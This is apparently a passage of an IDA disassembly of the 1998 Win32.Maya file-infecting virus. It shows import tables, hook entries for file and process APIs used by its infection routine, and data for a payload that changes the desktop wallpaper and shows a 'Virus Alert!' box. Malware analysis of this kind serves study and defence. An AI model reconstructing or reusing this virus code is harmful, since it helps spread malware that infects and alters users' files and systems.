CODE:00401CC0 ; HANDLE (__stdcall *FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)
CODE:00401CC0 FindFirstFileA  dd 0                    ; DATA XREF: InfectFiveFiles+11↑r
CODE:00401CC4                 dd 0Eh
CODE:00401CC8 aFindnextfilea  db 'FindNextFileA',0
CODE:00401CD6 ; BOOL (__stdcall *FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
CODE:00401CD6 FindNextFileA   dd 0                    ; DATA XREF: InfectFiveFiles+64↑r
CODE:00401CDA                 dd 0Ah
CODE:00401CDE aFindclose      db 'FindClose',0
CODE:00401CE8                 dd 0
CODE:00401CEC                 dd 0Fh
CODE:00401CF0 aSetfilepointer db 'SetFilePointer',0
CODE:00401CFF ; DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
CODE:00401CFF SetFilePointer  dd 0                    ; DATA XREF: SetFilePointer_0+7↑r
CODE:00401D03                 dd 0Dh
CODE:00401D07 aSetendoffile   db 'SetEndOfFile',0
CODE:00401D14 ; BOOL (__stdcall *SetEndOfFile)(HANDLE hFile)
CODE:00401D14 SetEndOfFile    dd 0                    ; DATA XREF: SetEndOfFile_0+2↑r
CODE:00401D18                 dd 15h
CODE:00401D1C aGetcurrentdire db 'GetCurrentDirectoryA',0
CODE:00401D31 ; DWORD (__stdcall *GetCurrentDirectoryA)(DWORD nBufferLength, LPSTR lpBuffer)
CODE:00401D31 GetCurrentDirectoryA dd 0               ; DATA XREF: GetCurrentDirectoryA_0+7↑r
CODE:00401D35                 dd 15h
CODE:00401D39 aSetcurrentdire db 'SetCurrentDirectoryA',0
CODE:00401D4E ; BOOL (__stdcall *SetCurrentDirectoryA)(LPCSTR lpPathName)
CODE:00401D4E SetCurrentDirectoryA dd 0               ; DATA XREF: SetCurrentDirectoryA_0+2↑r
CODE:00401D52                 dd 13h
CODE:00401D56 aGetfileattribu db 'GetFileAttributesA',0
CODE:00401D69 ; DWORD (__stdcall *GetFileAttributesA)(LPCSTR lpFileName)
CODE:00401D69 GetFileAttributesA dd 0                 ; DATA XREF: GetFileAttributesA_0+3↑r
CODE:00401D6D                 dd 13h
CODE:00401D71 aSetfileattribu db 'SetFileAttributesA',0
CODE:00401D84 ; BOOL (__stdcall *SetFileAttributesA)(LPCSTR lpFileName, DWORD dwFileAttributes)
CODE:00401D84 SetFileAttributesA dd 0                 ; DATA XREF: SetFileAttributesA_0+3↑r
CODE:00401D88                 dd 0Eh
CODE:00401D8C aGetsystemtime  db 'GetSystemTime',0
CODE:00401D9A ; void (__stdcall *GetSystemTime)(LPSYSTEMTIME lpSystemTime)
CODE:00401D9A GetSystemTime   dd 0                    ; DATA XREF: GetSystemTime_0+9↑r
CODE:00401D9E                 dd 15h
CODE:00401DA2 aGetwindowsdire db 'GetWindowsDirectoryA',0
CODE:00401DB7 ; UINT (__stdcall *GetWindowsDirectoryA)(LPSTR lpBuffer, UINT uSize)
CODE:00401DB7 GetWindowsDirectoryA dd 0               ; DATA XREF: GetWindowsDirectoryA_0+7↑r
CODE:00401DBB aAyam           db 'AYAM',0Ah,0         ; DATA XREF: HookFileFunctions↑o
CODE:00401DC1                 db 0
CODE:00401DC2                 db    0
CODE:00401DC3 aMovefilea      db 'MoveFileA',0
CODE:00401DCD ; BOOL (__stdcall *MoveFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName)
CODE:00401DCD MoveFileA       dd 0                    ; DATA XREF: HookMoveFileA+5↑r
CODE:00401DD1                 dd offset HookMoveFileA
CODE:00401DD5                 dd 0Ah
CODE:00401DD9 aCopyfilea      db 'CopyFileA',0
CODE:00401DE3 ; BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists)
CODE:00401DE3 CopyFileA       dd 0                    ; DATA XREF: HookCopyFileA+5↑r
CODE:00401DE7                 dd offset HookCopyFileA
CODE:00401DEB                 dd 0Ch
CODE:00401DEF aCreatefilea_0  db 'CreateFileA',0
CODE:00401DFB ; HANDLE __stdcall CreateFileA_1(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
CODE:00401DFB CreateFileA_1   dd 0                    ; DATA XREF: HookCreateFileA_1+5↑r
CODE:00401DFF                 dd offset HookCreateFileA_1
CODE:00401E03                 dd 0Ch
CODE:00401E07 aDeletefilea    db 'DeleteFileA',0
CODE:00401E13 ; BOOL __stdcall DeleteFileA(LPCSTR lpFileName)
CODE:00401E13 DeleteFileA     dd 0                    ; DATA XREF: HookDeleteFileA+5↑r
CODE:00401E17                 dd offset HookDeleteFileA
CODE:00401E1B                 dd 13h
CODE:00401E1F aSetfileattribu_0 db 'SetFileAttributesA',0
CODE:00401E32 ; BOOL __stdcall SetFileAttributesA_1(LPCSTR lpFileName, DWORD dwFileAttributes)
CODE:00401E32 SetFileAttributesA_1 dd 0               ; DATA XREF: HookSetFileAttributesA_1+5↑r
CODE:00401E36                 dd offset HookSetFileAttributesA_1
CODE:00401E3A                 dd 13h
CODE:00401E3E aGetfileattribu_0 db 'GetFileAttributesA',0
CODE:00401E51 ; DWORD __stdcall GetFileAttributesA_1(LPCSTR lpFileName)
CODE:00401E51 GetFileAttributesA_1 dd 0               ; DATA XREF: HookGetFileAttributesA_1+5↑r
CODE:00401E55                 dd offset HookGetFileAttributesA_1
CODE:00401E59                 dd 11h
CODE:00401E5D aGetfullpathnam db 'GetFullPathNameA',0
CODE:00401E6E ; DWORD __stdcall GetFullPathNameA(LPCSTR lpFileName, DWORD nBufferLength, LPSTR lpBuffer, LPSTR *lpFilePart)
CODE:00401E6E GetFullPathNameA dd 0                   ; DATA XREF: sub_40161B+5↑r
CODE:00401E72                 dd offset sub_40161B
CODE:00401E76                 dd 0Fh
CODE:00401E7A aCreateprocessa db 'CreateProcessA',0
CODE:00401E89 ; BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
CODE:00401E89 CreateProcessA  dd 0                    ; DATA XREF: HookCreateProcessA+5↑r
CODE:00401E8D                 dd offset HookCreateProcessA
CODE:00401E91 aIahscontrolPan db 'IAHSControl Panel\Desktop',0
CODE:00401E91                                         ; DATA XREF: Payload+13D↑o
CODE:00401EAB dword_401EAB    dd 0                    ; DATA XREF: Payload+131↑o
CODE:00401EAB                                         ; Payload+168↑r ...
CODE:00401EAF a1              db '1',0                ; DATA XREF: Payload+154↑o
CODE:00401EB1 a0              db '0',0                ; DATA XREF: Payload+178↑o
CODE:00401EB3 aTilewallpaper  db 'TileWallpaper',0    ; DATA XREF: Payload+160↑o
CODE:00401EC1 aWallpaperstyle db 'WallpaperStyle',0   ; DATA XREF: Payload+184↑o
CODE:00401ED0 aSlamBmp        db 'SLAM.BMP',0         ; DATA XREF: Payload+DF↑o
CODE:00401ED0                                         ; Payload+19C↑o
CODE:00401ED9 dword_401ED9    dd 0                    ; DATA XREF: Payload+F8↑w
CODE:00401ED9                                         ; Payload+115↑r ...
CODE:00401EDD byte_401EDD     db 3 dup(0)             ; DATA XREF: Payload+100↑o
CODE:00401EE0                 db 0
CODE:00401EE1 aWin32MayaC1998 db 'Win32.Maya (c) 1998 The Shaitan [SLAM]',0
CODE:00401EE1                                         ; DATA XREF: Payload+1BA↑o
CODE:00401F08 aVirusAlert     db 'Virus Alert!',0     ; DATA XREF: Payload+1B2↑o
CODE:00401F15 aUser32Dll      db 'USER32.dll',0       ; DATA XREF: Payload+13↑o
CODE:00401F20 aAdvapi32Dll    db 'ADVAPI32.dll',0     ; DATA XREF: Payload+2E↑o
CODE:00401F2D USER32_ImageBase dd 0                   ; DATA XREF: Payload+28↑w
CODE:00401F2D                                         ; Payload+92↑r ...
CODE:00401F31 ADVAPI32_ImageBase dd 0                 ; DATA XREF: Payload+43↑w
CODE:00401F31                                         ; Payload+50↑r ...
CODE:00401F35                 align 4
CODE:00401F38                 db 0
CODE:00401F39 aRegopenkeyexa  db 'RegOpenKeyExA',0    ; DATA XREF: Payload+49↑o
CODE:00401F47 aRegsetvalueexa db 'RegSetValueExA',0   ; DATA XREF: Payload+6A↑o
CODE:00401F56 aMessageboxa    db 'MessageBoxA',0      ; DATA XREF: Payload+8B↑o
CODE:00401F62 aSystemparamete db 'SystemParametersInfoA',0
CODE:00401F62                                         ; DATA XREF: Payload+AC↑o
CODE:00401F78 ; LSTATUS (__stdcall *RegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)
CODE:00401F78 RegOpenKeyExA   dd 0                    ; DATA XREF: Payload+64↑w
CODE:00401F78                                         ; Payload+14A↑r
CODE:00401F7C ; LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData)
CODE:00401F7C RegSetValueExA  dd 0                    ; DATA XREF: Payload+85↑w
CODE:00401F7C                                         ; Payload+16E↑r ...
CODE:00401F80 ; int (__stdcall *MessageBoxA_0)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
CODE:00401F80 MessageBoxA_0   dd 0                    ; DATA XREF: Payload+A6↑w
CODE:00401F80                                         ; Payload+1C4↑r
CODE:00401F84 ; BOOL (__stdcall *SystemParametersInfoA)(UINT uiAction, UINT uiParam, PVOID pvParam, UINT fWinIni)
CODE:00401F84 SystemParametersInfoA dd 0              ; DATA XREF: Payload+C7↑w
CODE:00401F84                                         ; Payload+1A8↑r
CODE:00401F88 dword_401F88    dd 0E64D42h, 0          ; DATA XREF: Payload+10D↑o
CODE:00401F90                 dd 3E0000h, 280000h, 3C0000h, 150000h, 10000h, 1, 0A80000h
CODE:00401FAC                 dd 2 dup(0EC40000h), 3 dup(0)
CODE:00401FC0                 dd 0FFFF0000h, 0FFFF00FFh, 0FFFFFFFFh, 0FFFFF0FFh, 0FFFFFFFFh
CODE:00401FD4                 dd 0FFFFF0FFh, 0FFFFFFFFh, 0FFFFF0FFh, 0FFFFFFFFh, 2E0F0FFh
CODE:00401FE8                 dd 0EE28300h, 2E0703Ch, 0EE28300h, 82E3703Ch, 0EE2830Fh
CODE:00401FFC                 dd 82E3703Ch, 0EE2830Fh, 82E3703Ch, 0E02800Fh, 82FF703Ch
CODE:00402010                 dd 0E02800Fh, 2E0703Ch, 1E86C31Fh, 2E0703Ch, 3E8EE33Fh
CODE:00402024                 dd 0FEE3703Ch, 3E8EE33Fh, 0E2E3703Ch, 3E8EE33Fh, 0E2E3703Ch
CODE:00402038                 dd 3E8EE33Fh, 0E2E3703Ch, 3E8EE33Fh, 2E0703Ch, 0EE03Fh
CODE:0040204C                 dd 2E07000h, 0EE03Fh, 0FFFF7000h, 0FFFFFFFFh, 0FFFFF0FFh
CODE:00402060                 dd 0FFFFFFFFh, 0FFFFF0FFh, 0FFFFFFFFh, 306AF0FFh
CODE:00402070                 db 68h
CODE:00402071                 dd offset aVirusAlert_0 ; "Virus Alert!"
CODE:00402075                 db 68h
CODE:00402076                 dd offset aWin32MayaC1998_0 ; "Win32.Maya (c) 1998 The Shaitan [SLAM]"
CODE:0040207A                 dw 6Ah
CODE:0040207C                 dd 47E8h, 0E8006A00h, 3Ah
CODE:00402088 aVirusAlert_0   db 'Virus Alert!',0     ; DATA XREF: CODE:00402071↑o
CODE:00402095 aWin32MayaC1998_0 db 'Win32.Maya (c) 1998 The Shaitan [SLAM]',0
CODE:00402095                                         ; DATA XREF: CODE:00402076↑o
CODE:004020BC ; [00000006 BYTES: COLLAPSED FUNCTION GetModuleHandleA. PRESS CTRL-NUMPAD+ TO EXPAND]
CODE:004020C2 ; [00000006 BYTES: COLLAPSED FUNCTION EXITPROCESS. PRESS CTRL-NUMPAD+ TO EXPAND]
CODE:004020C8 ; [00000006 BYTES: COLLAPSED FUNCTION MessageBoxA. PRESS CTRL-NUMPAD+ TO EXPAND]
CODE:004020CE                 align 200h
CODE:00402200                 dd 380h dup(?)
CODE:00402200 CODE            ends
CODE:00402200
DATA:00403000 ; Section 2. (virtual address 00003000)
DATA:00403000 ; Virtual size                  : 00001000 (   4096.)
DATA:00403000 ; Section size in file          : 00000200 (    512.)
DATA:00403000 ; Offset to raw data for section: 00001800
DATA:00403000 ; Flags C0000040: Data Readable Writable
DATA:00403000 ; Alignment     : default
DATA:00403000 ; ===========================================================================
DATA:00403000
DATA:00403000 ; Segment type: Pure data
DATA:00403000 ; Segment permissions: Read/Write
DATA:00403000 DATA            segment para public 'DATA' use32
DATA:00403000                 assume cs:DATA
DATA:00403000                 ;org 403000h
DATA:00403000 aAyam_0         db 'AYAM',0
DATA:00403005                 align 1000h
DATA:00403005 DATA            ends
DATA:00403005
.idata:00404000 ; Section 3. (virtual address 00004000)
.idata:00404000 ; Virtual size                  : 00001000 (   4096.)
.idata:00404000 ; Section size in file          : 00000200 (    512.)
.idata:00404000 ; Offset to raw data for section: 00001A00
.idata:00404000 ; Flags C0000040: Data Readable Writable
.idata:00404000 ; Alignment     : default
.idata:00404000 ; ===========================================================================
.idata:00404000
.idata:00404000 ; Segment type: Externs
.idata:00404000 ; _idata
.idata:00404000
.idata:00404001
.idata:00404050 ;
.idata:00404050 ; Imports from KERNEL32.dll
.idata:00404050 ;
.idata:00404050 ; HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName)
.idata:00404050                 extrn __imp_GetModuleHandleA:dword
.idata:00404050                                         ; DATA XREF: GetModuleHandleA↑r
.idata:00404054                 extrn __imp_EXITPROCESS:dword
.idata:00404054                                         ; DATA XREF: EXITPROCESS↑r
.idata:00404058
.idata:0040405C ;
.idata:0040405C ; Imports from USER32.dll
.idata:0040405C ;
.idata:0040405C ; int (__stdcall *MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
.idata:0040405C                 extrn __imp_MessageBoxA:dword
.idata:0040405C                                         ; DATA XREF: MessageBoxA↑r
.idata:00404060
.idata:00404060
.idata:00404060
.idata:00404060                 end start
